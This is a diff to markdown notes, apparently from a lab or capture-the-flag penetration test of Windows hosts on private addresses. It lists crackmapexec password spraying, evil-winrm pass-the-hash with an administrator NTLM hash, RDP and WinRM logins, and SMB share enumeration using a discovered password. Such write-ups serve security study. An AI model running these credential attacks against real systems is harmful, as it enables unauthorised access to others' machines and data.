@@ -38,3 +38,35 @@ Password : Nothingtoworry!
 
 ![[Pasted image 20240830041056.png]]
 
+
+```
+crackmapexec smb 10.201.11.31 -u valid_user.txt -p Nothingtoworry!
+```
+
+
+```
+evil-winrm -u administrator -H 3179c8ec65934b8d33ac9ec2a9d93400 -i 10.201.11.35
+```
+
+
+```
+evil-winrm -u watamet -password Nothingtoworry! -i 10.201.11.35
+```
+
+That didn't worked but we should always try for little hanging fruits
+```
+rdesktop -u watamet -p Nothingtoworry! 10.201.11.30
+```
+
+Read/Write
+```
+crackmapexec smb 10.201.11.30 -u 'watamet' -p 'Nothingtoworry!' --shares
+```
+![[Pasted image 20240830043757.png]]
+
+```
+smbclient \\\\10.201.11.30\\SYSVOL -U 'watamet' 
+```
+
+-p 'Nothingtoworry!'
+
